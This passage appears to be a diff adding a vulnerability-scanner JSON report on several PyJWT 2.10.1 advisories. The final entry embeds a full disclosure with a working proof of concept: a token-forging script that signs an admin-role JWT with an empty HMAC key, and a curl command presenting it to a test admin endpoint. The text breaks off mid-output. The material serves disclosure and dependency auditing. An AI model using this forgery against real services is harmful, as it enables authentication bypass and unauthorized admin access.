+          "PkgPath": "usr/local/lib/python3.13/site-packages/PyJWT-2.10.1.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/pyjwt@2.10.1",
+            "UID": "20be61d8870c9491"
+          },
+          "InstalledVersion": "2.10.1",
+          "FixedVersion": "2.14.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:fedec2ec703659d97a141f740c40415a1202ef024ee6606aff9120d74a5503f8",
+            "DiffID": "sha256:6da2143d4daa1ec9957b2fea0ee37bec387abdc82ebddb8762da9ac3874b2cea"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-102267",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:f467bf1af10b62c1867d9e75705884be647b4cf5a8cf4dda8bf101b7df80eb78",
+          "Title": "pyjwt: pyjwt: Verification key substitution via unvalidated JWKS redirects",
+          "Description": "PyJWT is a Python implementation of JSON Web Token standards. Prior to 2.14.0, PyJWT PyJWKClient is affected because redirect destinations are not revalidated against the JWKS trust boundary. This occurs when a configured trusted JWKS endpoint returns an attacker-influenced redirect. As a result, PyJWKClient follows the redirect and consumes the redirected response as key material. Consequently, forwarded credentials may be disclosed or verification keys may be substituted. This issue is fixed in version 2.14.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-200",
+            "CWE-345",
+            "CWE-918"
+          ],
+          "VendorSeverity": {
+            "alma": 4,
+            "amazon": 3,
+            "azure": 3,
+            "ghsa": 3,
+            "nvd": 4,
+            "oracle-oval": 4,
+            "photon": 4,
+            "redhat": 3,
+            "rocky": 4,
+            "ubuntu": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 7.4
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 9.1
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 7.4
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:98503",
+            "https://access.redhat.com/security/cve/CVE-2026-102267",
+            "https://bugzilla.redhat.com/2542671",
+            "https://bugzilla.redhat.com/2542685",
+            "https://bugzilla.redhat.com/2542687",
+            "https://bugzilla.redhat.com/2542690",
+            "https://bugzilla.redhat.com/2542695",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2542671",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2542685",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2542687",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2542690",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2542695",
+            "https://creativecommons.org/licenses/by/4.0/",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-102266",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-102267",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-102268",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-102271",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-102272",
+            "https://errata.almalinux.org/9/ALSA-2026-98503.html",
+            "https://errata.rockylinux.org/RLSA-2026:98503",
+            "https://github.com/jpadilla/pyjwt",
+            "https://github.com/jpadilla/pyjwt/commit/0a795b8e1f6ef08f634aa7086fc41cc6d5ce3e56",
+            "https://github.com/jpadilla/pyjwt/releases/tag/2.14.0",
+            "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-9v7f-9g4p-ffgj",
+            "https://linux.oracle.com/cve/CVE-2026-102267.html",
+            "https://linux.oracle.com/errata/ELSA-2026-98503.html",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-102267",
+            "https://ubuntu.com/security/notices/USN-8916-1",
+            "https://ubuntu.com/security/notices/USN-8916-2",
+            "https://www.cve.org/CVERecord?id=CVE-2026-102267"
+          ],
+          "PublishedDate": "2026-09-28T21:17:14.43Z",
+          "LastModifiedDate": "2026-10-07T20:27:45.713Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-102271",
+          "VendorIDs": [
+            "GHSA-p4g4-x82p-q773"
+          ],
+          "PkgName": "PyJWT",
+          "PkgPath": "usr/local/lib/python3.13/site-packages/PyJWT-2.10.1.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/pyjwt@2.10.1",
+            "UID": "20be61d8870c9491"
+          },
+          "InstalledVersion": "2.10.1",
+          "FixedVersion": "2.14.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:fedec2ec703659d97a141f740c40415a1202ef024ee6606aff9120d74a5503f8",
+            "DiffID": "sha256:6da2143d4daa1ec9957b2fea0ee37bec387abdc82ebddb8762da9ac3874b2cea"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-102271",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:6fa333857cf9dbb11bd29dc0ab4936ddadb5a4a11c56102ec471ada6c8e0e93c",
+          "Title": "pyjwt: PyJWT: Authentication bypass via acceptance of DER public keys as HMAC secrets",
+          "Description": "PyJWT is a Python implementation of JSON Web Token standards. From 2.4.0 until 2.14.0, PyJWT HMACAlgorithm.prepare_key is affected because asymmetric-key guard relies on textual markers that are absent from DER encoding. This occurs when an application mixes HMAC and asymmetric algorithms and supplies a DER public key as the shared verification key. As a result, PyJWT uses public DER bytes as an HMAC secret. Consequently, an attacker who knows the public key can forge authenticated HMAC tokens. This issue is fixed in version 2.14.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-347"
+          ],
+          "VendorSeverity": {
+            "alma": 4,
+            "amazon": 3,
+            "azure": 3,
+            "ghsa": 3,
+            "oracle-oval": 4,
+            "photon": 3,
+            "redhat": 3,
+            "rocky": 4,
+            "ubuntu": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 7.4
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 7.4
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:98503",
+            "https://access.redhat.com/security/cve/CVE-2026-102271",
+            "https://bugzilla.redhat.com/2542671",
+            "https://bugzilla.redhat.com/2542685",
+            "https://bugzilla.redhat.com/2542687",
+            "https://bugzilla.redhat.com/2542690",
+            "https://bugzilla.redhat.com/2542695",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2542671",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2542685",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2542687",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2542690",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2542695",
+            "https://creativecommons.org/licenses/by/4.0/",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-102266",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-102267",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-102268",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-102271",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-102272",
+            "https://errata.almalinux.org/9/ALSA-2026-98503.html",
+            "https://errata.rockylinux.org/RLSA-2026:98503",
+            "https://github.com/jpadilla/pyjwt",
+            "https://github.com/jpadilla/pyjwt/commit/2798504fa2663364573cf2d1043d8d7fef389499",
+            "https://github.com/jpadilla/pyjwt/releases/tag/2.14.0",
+            "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-p4g4-x82p-q773",
+            "https://linux.oracle.com/cve/CVE-2026-102271.html",
+            "https://linux.oracle.com/errata/ELSA-2026-98503.html",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-102271",
+            "https://ubuntu.com/security/notices/USN-8916-1",
+            "https://ubuntu.com/security/notices/USN-8916-2",
+            "https://www.cve.org/CVERecord?id=CVE-2026-102271"
+          ],
+          "PublishedDate": "2026-09-28T21:17:15.11Z",
+          "LastModifiedDate": "2026-10-06T18:36:16.047Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-32597",
+          "VendorIDs": [
+            "GHSA-752w-5fwx-jx9f"
+          ],
+          "PkgName": "PyJWT",
+          "PkgPath": "usr/local/lib/python3.13/site-packages/PyJWT-2.10.1.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/pyjwt@2.10.1",
+            "UID": "20be61d8870c9491"
+          },
+          "InstalledVersion": "2.10.1",
+          "FixedVersion": "2.12.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:fedec2ec703659d97a141f740c40415a1202ef024ee6606aff9120d74a5503f8",
+            "DiffID": "sha256:6da2143d4daa1ec9957b2fea0ee37bec387abdc82ebddb8762da9ac3874b2cea"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-32597",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:5805e622e18c3a87b39b3f0b52423a91fbc9779b59f55608be42dd3c48d7736d",
+          "Title": "pyjwt: PyJWT accepts unknown `crit` header extensions (RFC 7515 §4.1.11 MUST violation)",
+          "Description": "PyJWT is a JSON Web Token implementation in Python. Prior to 2.12.0, PyJWT does not validate the crit (Critical) Header Parameter defined in RFC 7515 §4.1.11. When a JWS token contains a crit array listing extensions that PyJWT does not understand, the library accepts the token instead of rejecting it. This violates the MUST requirement in the RFC. This vulnerability is fixed in 2.12.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-345",
+            "CWE-863",
+            "CWE-347"
+          ],
+          "VendorSeverity": {
+            "alma": 3,
+            "amazon": 2,
+            "azure": 3,
+            "ghsa": 3,
+            "oracle-oval": 3,
+            "photon": 3,
+            "redhat": 3,
+            "rocky": 3,
+            "ubuntu": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:10140",
+            "https://access.redhat.com/errata/RHSA-2026:10141",
+            "https://access.redhat.com/errata/RHSA-2026:10184",
+            "https://access.redhat.com/errata/RHSA-2026:12176",
+            "https://access.redhat.com/errata/RHSA-2026:13508",
+            "https://access.redhat.com/errata/RHSA-2026:13512",
+            "https://access.redhat.com/errata/RHSA-2026:13545",
+            "https://access.redhat.com/errata/RHSA-2026:13553",
+            "https://access.redhat.com/errata/RHSA-2026:13672",
+            "https://access.redhat.com/errata/RHSA-2026:13916",
+            "https://access.redhat.com/errata/RHSA-2026:17083",
+            "https://access.redhat.com/errata/RHSA-2026:19138",
+            "https://access.redhat.com/errata/RHSA-2026:19355",
+            "https://access.redhat.com/errata/RHSA-2026:19375",
+            "https://access.redhat.com/errata/RHSA-2026:19712",
+            "https://access.redhat.com/errata/RHSA-2026:21431",
+            "https://access.redhat.com/errata/RHSA-2026:21517",
+            "https://access.redhat.com/errata/RHSA-2026:22330",
+            "https://access.redhat.com/errata/RHSA-2026:24977",
+            "https://access.redhat.com/errata/RHSA-2026:26226",
+            "https://access.redhat.com/errata/RHSA-2026:37275",
+            "https://access.redhat.com/errata/RHSA-2026:42644",
+            "https://access.redhat.com/errata/RHSA-2026:6568",
+            "https://access.redhat.com/errata/RHSA-2026:6720",
+            "https://access.redhat.com/errata/RHSA-2026:6912",
+            "https://access.redhat.com/errata/RHSA-2026:6926",
+            "https://access.redhat.com/errata/RHSA-2026:8437",
+            "https://access.redhat.com/errata/RHSA-2026:8746",
+            "https://access.redhat.com/errata/RHSA-2026:8747",
+            "https://access.redhat.com/errata/RHSA-2026:8748",
+            "https://access.redhat.com/errata/RHSA-2026:93440",
+            "https://access.redhat.com/security/cve/CVE-2026-32597",
+            "https://advisory.echohq.com/cve/CVE-2026-32597",
+            "https://bugzilla.redhat.com/2447194",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2438762",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2447194",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2448553",
+            "https://creativecommons.org/licenses/by/4.0/",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-26007",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-30922",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32597",
+            "https://errata.almalinux.org/8/ALSA-2026-93440.html",
+            "https://errata.rockylinux.org/RLSA-2026:19355",
+            "https://github.com/jpadilla/pyjwt",
+            "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-752w-5fwx-jx9f",
+            "https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-120.yaml",
+            "https://linux.oracle.com/cve/CVE-2026-32597.html",
+            "https://linux.oracle.com/errata/ELSA-2026-93440.html",
+            "https://lists.debian.org/debian-lts-announce/2026/05/msg00008.html",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-32597",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-32597.json",
+            "https://ubuntu.com/security/notices/USN-8133-1",
+            "https://www.cve.org/CVERecord?id=CVE-2026-32597"
+          ],
+          "PublishedDate": "2026-03-13T19:55:09.5Z",
+          "LastModifiedDate": "2026-09-10T13:18:12.027Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-48526",
+          "VendorIDs": [
+            "GHSA-xgmm-8j9v-c9wx"
+          ],
+          "PkgName": "PyJWT",
+          "PkgPath": "usr/local/lib/python3.13/site-packages/PyJWT-2.10.1.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/pyjwt@2.10.1",
+            "UID": "20be61d8870c9491"
+          },
+          "InstalledVersion": "2.10.1",
+          "FixedVersion": "2.13.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:fedec2ec703659d97a141f740c40415a1202ef024ee6606aff9120d74a5503f8",
+            "DiffID": "sha256:6da2143d4daa1ec9957b2fea0ee37bec387abdc82ebddb8762da9ac3874b2cea"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-48526",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:08bd06ae4d1edd3bf31398588943dc2fa178d295f5d1ed7693a915d14ba63a35",
+          "Title": "python-pyjwt: PyJWT: Authentication bypass due to forged JSON Web Tokens",
+          "Description": "PyJWT is a JSON Web Token implementation in Python. Prior to 2.13.0, when the verifier is decoding JSON Web Tokens, while supporting both asymmetric and HMAC algorithms, the library does not validate use of JSON Web Keys in HMAC algorithm, allowing attacker to use the issuer public key as the secret key for HMAC algorithm. This vulnerability is fixed in 2.13.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-287",
+            "CWE-347"
+          ],
+          "VendorSeverity": {
+            "alma": 3,
+            "amazon": 3,
+            "azure": 3,
+            "ghsa": 3,
+            "oracle-oval": 3,
+            "photon": 3,
+            "redhat": 3,
+            "rocky": 3,
+            "ubuntu": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 7.4
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 7.4
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:25902",
+            "https://access.redhat.com/errata/RHSA-2026:25928",
+            "https://access.redhat.com/errata/RHSA-2026:26206",
+            "https://access.redhat.com/errata/RHSA-2026:28571",
+            "https://access.redhat.com/errata/RHSA-2026:30076",
+            "https://access.redhat.com/errata/RHSA-2026:30088",
+            "https://access.redhat.com/errata/RHSA-2026:30089",
+            "https://access.redhat.com/errata/RHSA-2026:33683",
+            "https://access.redhat.com/errata/RHSA-2026:34160",
+            "https://access.redhat.com/errata/RHSA-2026:34365",
+            "https://access.redhat.com/errata/RHSA-2026:34374",
+            "https://access.redhat.com/errata/RHSA-2026:35835",
+            "https://access.redhat.com/errata/RHSA-2026:35836",
+            "https://access.redhat.com/errata/RHSA-2026:35837",
+            "https://access.redhat.com/errata/RHSA-2026:35845",
+            "https://access.redhat.com/errata/RHSA-2026:36350",
+            "https://access.redhat.com/errata/RHSA-2026:37275",
+            "https://access.redhat.com/errata/RHSA-2026:40967",
+            "https://access.redhat.com/errata/RHSA-2026:41066",
+            "https://access.redhat.com/errata/RHSA-2026:42132",
+            "https://access.redhat.com/errata/RHSA-2026:42142",
+            "https://access.redhat.com/errata/RHSA-2026:42144",
+            "https://access.redhat.com/errata/RHSA-2026:42644",
+            "https://access.redhat.com/errata/RHSA-2026:42796",
+            "https://access.redhat.com/errata/RHSA-2026:43038",
+            "https://access.redhat.com/errata/RHSA-2026:48085",
+            "https://access.redhat.com/errata/RHSA-2026:50222",
+            "https://access.redhat.com/errata/RHSA-2026:50223",
+            "https://access.redhat.com/errata/RHSA-2026:50263",
+            "https://access.redhat.com/errata/RHSA-2026:50319",
+            "https://access.redhat.com/errata/RHSA-2026:50336",
+            "https://access.redhat.com/errata/RHSA-2026:50340",
+            "https://access.redhat.com/errata/RHSA-2026:50904",
+            "https://access.redhat.com/errata/RHSA-2026:60520",
+            "https://access.redhat.com/security/cve/CVE-2026-48526",
+            "https://bugzilla.redhat.com/2482734",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2482734",
+            "https://creativecommons.org/licenses/by/4.0/",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-48526",
+            "https://errata.almalinux.org/9/ALSA-2026-26206.html",
+            "https://errata.rockylinux.org/RLSA-2026:26206",
+            "https://github.com/jpadilla/pyjwt",
+            "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-xgmm-8j9v-c9wx",
+            "https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-179.yaml",
+            "https://linux.oracle.com/cve/CVE-2026-48526.html",
+            "https://linux.oracle.com/errata/ELSA-2026-26206.html",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-48526",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-48526.json",
+            "https://ubuntu.com/security/notices/USN-8823-1",
+            "https://www.cve.org/CVERecord?id=CVE-2026-48526"
+          ],
+          "PublishedDate": "2026-05-28T16:16:29.657Z",
+          "LastModifiedDate": "2026-10-26T13:10:00.14Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-pxh4-856f-4h89",
+          "PkgName": "PyJWT",
+          "PkgPath": "usr/local/lib/python3.13/site-packages/PyJWT-2.10.1.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/pyjwt@2.10.1",
+            "UID": "20be61d8870c9491"
+          },
+          "InstalledVersion": "2.10.1",
+          "FixedVersion": "2.14.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:fedec2ec703659d97a141f740c40415a1202ef024ee6606aff9120d74a5503f8",
+            "DiffID": "sha256:6da2143d4daa1ec9957b2fea0ee37bec387abdc82ebddb8762da9ac3874b2cea"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-pxh4-856f-4h89",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:1ead3ac29d6d2b6f005e4f9bbabe3fea35f6e3fe5426ed4d9baa47d9c9d9c2e0",
+          "Title": "PyJWT: HS256/384/512 verify accepts empty HMAC key via oct JWK (PyJWK/PyJWKClient) enabling token forgery",
+          "Description": "### Summary\n\n`HMACAlgorithm.from_jwk` accepts a symmetric (`kty=oct`) JWK whose `k` value is\nthe empty string and returns a zero-length key without raising. When a token is\nthen verified with that key object (a `PyJWK`, or a `PyJWK` resolved by\n`PyJWKSet` / `PyJWKClient`), the HMAC verifier computes\n`HMAC(key=b\"\", signing_input)` and accepts any token an attacker forged with the\nsame empty key. The attacker needs no secret knowledge: they reproduce the digest\nlocally with an empty key and set the token's `kid` to the empty-`k` JWK.\n\nThe empty-key rejection that `HMACAlgorithm.prepare_key` performs for\nstring/bytes secrets (added in 2.13.0) was never propagated to the sibling\n`from_jwk` code path, so the JWK/JWKS verification route stays exploitable. Under\ndefault decode options this path only emits an `InsecureKeyLengthWarning`, not an\nerror, so verification still succeeds. This is the same \"empty/nil HMAC key is\naccepted by verify\" defect the JWT ecosystem is currently closing library-side:\nfast-jwt CVE-2026-44351 (CVSS 9.1) and ruby-jwt CVE-2026-45363 both added a\nlibrary-side reject-empty-HMAC-key precondition.\n\n### Affected versions\n\n`PyJWT` (PyPI package `pyjwt`) `\u003c= 2.13.0`, current `master` at commit\n`7144e4534c34810f4525dc4578a32addd8212cff`. The string/bytes secret path is\nalready guarded in 2.13.0; the JWK/JWKS path is not.\n\n### Privilege required\n\nUnauthenticated. Any party who can reach a JWT-verifying endpoint of an\napplication that verifies via a `PyJWK` / `PyJWKSet` / `PyJWKClient` whose oct\nkey has an empty `k` can forge tokens with arbitrary claims.\n\nPreconditions: the verifier resolves the HMAC key from a JWK/JWKS whose oct\nentry carries an empty `k`. This occurs when the signing secret is sourced from\nan unset environment variable / unset config row / key-finder fallback that\nbase64url-encodes `b\"\"` into the published JWKS, or when the application trusts a\nJWKS containing such an entry. The equivalent unset-secret case for the\nstring-secret API (`jwt.decode(token, key=\"\")`) is already rejected in 2.13.0;\nthe JWK route is the remaining reachable surface for the same misconfiguration.\n\n### Vulnerable code\n\n`jwt/algorithms.py`, `HMACAlgorithm.from_jwk` (line 380):\n\n```python\n@staticmethod\ndef from_jwk(jwk: str | JWKDict) -\u003e bytes:\n    try:\n        if isinstance(jwk, str):\n            obj: JWKDict = json.loads(jwk)\n        elif isinstance(jwk, dict):\n            obj = jwk\n        else:\n            raise ValueError\n    except ValueError:\n        raise InvalidKeyError(\"Key is not valid JSON\") from None\n\n    if obj.get(\"kty\") != \"oct\":\n        raise InvalidKeyError(\"Not an HMAC key\")\n\n    return base64url_decode(obj[\"k\"])   # \u003c-- empty k -\u003e b\"\", no rejection\n```\n\nContrast the sibling `prepare_key`, which DID get the guard (lines 325-329):\n\n```python\ndef prepare_key(self, key: str | bytes) -\u003e bytes:\n    key_bytes = force_bytes(key)\n\n    if len(key_bytes) == 0:\n        raise InvalidKeyError(\"HMAC key must not be empty.\")\n```\n\nIn `jwt/api_jws.py`, `_verify_signature` (lines 389-416) uses the `PyJWK` key\nmaterial directly, bypassing `prepare_key`, and the length warning is non-fatal\nby default:\n\n```python\n        if isinstance(key, PyJWK):\n            if alg != key.algorithm_name:\n                raise InvalidAlgorithmError(\n                    f\"Token algorithm {alg!r} does not match the key's \"\n                    f\"algorithm {key.algorithm_name!r}\"\n                )\n            alg_obj = key.Algorithm\n            prepared_key = key.key            # from_jwk output (b\"\"), prepare_key not run\n        else:\n            try:\n                alg_obj = self.get_algorithm_by_name(alg)\n            except NotImplementedError as e:\n                raise InvalidAlgorithmError(\"Algorithm not supported\") from e\n            prepared_key = alg_obj.prepare_key(key)\n\n        key_length_msg = alg_obj.check_key_length(prepared_key)\n        if key_length_msg:\n            if effective_options.get(\"enforce_minimum_key_length\", False):\n                raise InvalidKeyError(key_length_msg)\n            else:\n                warnings.warn(key_length_msg, InsecureKeyLengthWarning, stacklevel=4)  # default: warn only\n\n        if not alg_obj.verify(signing_input, prepared_key, signature):  # verify with b\"\" succeeds\n            raise InvalidSignatureError(\"Signature verification failed\")\n```\n\n`PyJWK.__init__` sets `self.key = self.Algorithm.from_jwk(self._jwk_data)`, so a\n`{\"kty\":\"oct\",\"k\":\"\"}` JWK yields `PyJWK.key == b\"\"`. `PyJWKSet` and\n`PyJWKClient.get_signing_key_from_jwt` build `PyJWK` objects the same way, so the\nJWKS-over-HTTP resolution route is affected identically.\n\nThe 2.13.0 release note (`CHANGELOG.rst`) documents the `prepare_key` JWK/PEM\nhardening (GHSA-xgmm-8j9v-c9wx) and the `PyJWK` alg-binding fix\n(GHSA-jq35-7prp-9v3f), and the test suite has\n`test_hmac_prepare_key_rejects_empty_key` plus\n`test_hmac_from_jwk_should_raise_exception_if_empty_json` (which tests an empty\nJSON object `{}`, not an oct key with empty `k`). The empty-`k` oct case is the\nuntested sibling path this report closes.\n\n### How the attacker input reaches the sink\n\nAn unauthenticated HTTP client controls the bearer token entirely: its `kid`\nselects the empty-`k` oct JWK, and its signature is computed locally with the\nempty key. The token flows request header -\u003e `PyJWKClient.get_signing_key_from_jwt`\n(kid resolution against the trusted JWKS) -\u003e `jwt.decode` with the resolved\n`PyJWK` -\u003e `_verify_signature` -\u003e `HMACAlgorithm.verify(signing_input, b\"\", sig)`.\nNo secret,\ncredential, or prior session is required; the only server-side precondition is a\nJWKS oct entry with an empty `k`, which the \"unset signing secret\" configuration\nproduces. This is the identical trust boundary the string-secret path already\nguards.\n\n### Proof of concept\n\n### End-to-end reproduction against pinned PyPI `pyjwt` 2.13.0 (two deployed Flask services)\n\nTwo services model a standard OIDC-style deployment: an auth service publishing a\nJWKS, and a protected resource server validating bearer tokens against that JWKS\nwith PyJWT's documented `PyJWKClient` pattern. The auth service's signing secret\nis sourced from an unset env var (`SIGNING_SECRET` unset -\u003e `\"\"`), so the\npublished oct JWK carries `k == \"\"`.\n\n`idp.py` (auth service):\n\n```python\nimport os, base64\nfrom flask import Flask, jsonify\napp = Flask(__name__)\nSIGNING_SECRET = os.environ.get(\"SIGNING_SECRET\", \"\")   # UNSET at runtime -\u003e \"\"\ndef b64u(b): return base64.urlsafe_b64encode(b).rstrip(b\"=\").decode()\n\n@app.route(\"/.well-known/jwks.json\")\ndef jwks():\n    return jsonify({\"keys\": [{\n        \"kty\": \"oct\", \"use\": \"sig\", \"alg\": \"HS256\",\n        \"kid\": \"auth-signing-2026\",\n        \"k\": b64u(SIGNING_SECRET.encode()),   # empty secret -\u003e k == \"\"\n    }]})\n\nif __name__ == \"__main__\":\n    app.run(port=9101)\n```\n\n`api.py` (protected resource server):\n\n```python\nfrom flask import Flask, request, jsonify\nimport jwt\nfrom jwt import PyJWKClient\napp = Flask(__name__)\njwks_client = PyJWKClient(\"http://127.0.0.1:9101/.well-known/jwks.json\")\n\ndef authenticate():\n    auth = request.headers.get(\"Authorization\", \"\")\n    if not auth.startswith(\"Bearer \"):\n        return None, \"missing bearer token\"\n    token = auth.split(\" \", 1)[1]\n    try:\n        signing_key = jwks_client.get_signing_key_from_jwt(token)  # resolves by kid\n        claims = jwt.decode(token, signing_key, algorithms=[\"HS256\", \"RS256\"])\n    except Exception as e:\n        return None, \"invalid token: %s\" % type(e).__name__\n    return claims, None\n\n@app.route(\"/api/admin/users\")\ndef admin_users():\n    claims, err = authenticate()\n    if err:\n        return jsonify({\"error\": err}), 401\n    if claims.get(\"role\") != \"admin\":\n        return jsonify({\"error\": \"forbidden\"}), 403\n    return jsonify({\"ok\": True, \"action\": \"list_all_users\",\n                    \"as_user\": claims.get(\"sub\"), \"role\": claims.get(\"role\")})\n\nif __name__ == \"__main__\":\n    app.run(port=9102)\n```\n\n`forge.py` (attacker; no secret knowledge):\n\n```python\nimport hmac, hashlib, base64, json, sys\ndef b64u(b): return base64.urlsafe_b64encode(b).rstrip(b\"=\").decode()\nheader={\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"auth-signing-2026\"}\npayload={\"sub\":\"attacker@evil.example\",\"role\":\"admin\"}\nsi=b64u(json.dumps(header,separators=(',',':')).encode())+\".\"+b64u(json.dumps(payload,separators=(',',':')).encode())\nkey = sys.argv[1].encode() if len(sys.argv)\u003e1 else b\"\"   # empty key\nsig=hmac.new(key, si.encode(), hashlib.sha256).digest()\nprint(si+\".\"+b64u(sig))\n```\n\nRun:\n\n```bash\npython -m venv v \u0026\u0026 ./v/bin/pip install \"PyJWT==2.13.0\" flask\n( SIGNING_SECRET= ./v/bin/python idp.py \u0026 ) ; ./v/bin/python api.py \u0026\nFORGED=$(./v/bin/python forge.py \"\")\ncurl -s -H \"Authorization: Bearer $FORGED\" http://127.0.0.1:9102/api/admin/users\n```\n\nVerbatim run (attack, both negative controls, sanity, and patched-build re-run):\n\n```\n### PyJWT version\n2.13.0\n\n### JWKS published by the auth service (note the empty \"k\"):\n{\"keys\":[{\"alg\":\"HS256\",\"k\":\"\",\"kid\":\"auth-signing-2026\",\"kty\":\"oct\",\"use\":\"sig\"}]}\n\n### Baseline: unauthenticated request to admin 